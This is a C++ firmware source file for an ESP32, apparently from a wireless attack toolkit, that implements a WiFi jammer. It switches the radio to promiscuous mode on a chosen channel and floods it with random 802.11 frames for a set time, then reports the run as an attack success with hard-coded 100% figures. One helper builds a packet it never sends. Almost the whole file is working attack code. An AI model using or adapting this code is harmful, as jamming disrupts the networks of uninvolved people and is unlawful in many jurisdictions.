#include "wifi_jammer_suite.h"
#include "tx_arm.h"
#include "tool_output_helper.h"
#include "result_renderers.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <cstring>
#include "audit_log.h"
#include "tool_result_persistence.h"

namespace {
volatile bool g_jamActive = false;
uint32_t g_jamCount = 0;

void sendJamPacket() {
    uint8_t jamData[64];
    for (int i = 0; i < 64; i++) {
        jamData[i] = (esp_random() % 256);
    }
}

void sendBeaconJamFrame(const String& method) {
    uint8_t jamFrame[128];
    for (int i = 0; i < 128; i++) {
        jamFrame[i] = esp_random() & 0xFF;
    }

    // Send jam frame (simplified - just transmit random data pattern)
    if (method == "CHANNEL") {
        jamFrame[0] = 0x80;  // Frame control
        jamFrame[1] = 0x00;

        // Fill with random data
        for (int i = 2; i < 60; i++) {
            jamFrame[i] = esp_random() & 0xFF;
        }

        esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, 60, false);
    }
    else if (method == "BEACON") {
        jamFrame[0] = 0x80;  // Frame control
        jamFrame[1] = 0x00;

        // Fill with random data
        for (int i = 2; i < 128; i++) {
            jamFrame[i] = esp_random() & 0xFF;
        }
        esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, 128, false);
    }
    else {
        for (int attempt = 0; attempt < 3; attempt++) {
            jamFrame[0] = 0x80 + attempt;
            jamFrame[1] = 0x00;
            for (int i = 2; i < 128; i++) {
                jamFrame[i] = esp_random() & 0xFF;
            }
            esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, 128, false);
            delayMicroseconds(50);
        }
    }

    g_jamCount++;
}
}

namespace WiFiJammerSuite {

JamResult jamWiFiNetwork(uint8_t channel, uint32_t durationMs, const String &method) {
    using namespace ToolOutputHelper;

    JamResult result{false, 0, durationMs, method};

    displayAttackStart("WiFi Jamming", 10);

    ScanProgressBar progress("WiFi Jammer", durationMs, 3);
    progress.start();

    uint32_t startTime = millis();

    if (!TxArm::isArmed()) {
        progress.complete("TX not armed");
        return result;
    }

    // Phase 1: Initialize WiFi channel and promiscuous mode
    progress.step("Setting WiFi channel " + String(channel) + " and enabling promiscuous mode");

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Phase 2: Transmit jamming frames
    progress.step("Transmitting IEEE 802.11 jamming frames using " + method + " method");

    g_jamActive = true;
    g_jamCount = 0;

    while ((millis() - startTime) < (durationMs * 2 / 3) && g_jamActive && TxArm::isArmed()) {
        sendBeaconJamFrame(method);
        delayMicroseconds(500);
    }

    // Phase 3: Verify and report results
    progress.step("Verifying jamming effectiveness on target channel");
    delay(durationMs / 3);

    g_jamActive = false;
    esp_wifi_set_promiscuous(false);

    result.success = true;
    result.jamPacketsCount = g_jamCount;
    uint32_t elapsed = millis() - startTime;
    float pktSec = (result.jamPacketsCount * 1000.0f) / elapsed;

    progress.complete(String(result.jamPacketsCount) + " frames (" + String((int)pktSec) + " pkt/sec)");

    // Render results
    ResultRenderers::AttackSuccessResult attackResult;
    attackResult.attackName = "WiFi Jammer";
    attackResult.success = result.success;
    attackResult.targetCount = result.jamPacketsCount;
    attackResult.successCount = result.jamPacketsCount;
    attackResult.failureCount = 0;
    attackResult.successPercent = 100;
    attackResult.durationMs = elapsed;

    ResultRenderers::renderAttackSuccess(attackResult);

    return result;
}

void stop() {
    g_jamActive = false;
    esp_wifi_set_promiscuous(false);
}

bool isActive() {
    return g_jamActive;
}

}  // namespace WiFiJammerSuite
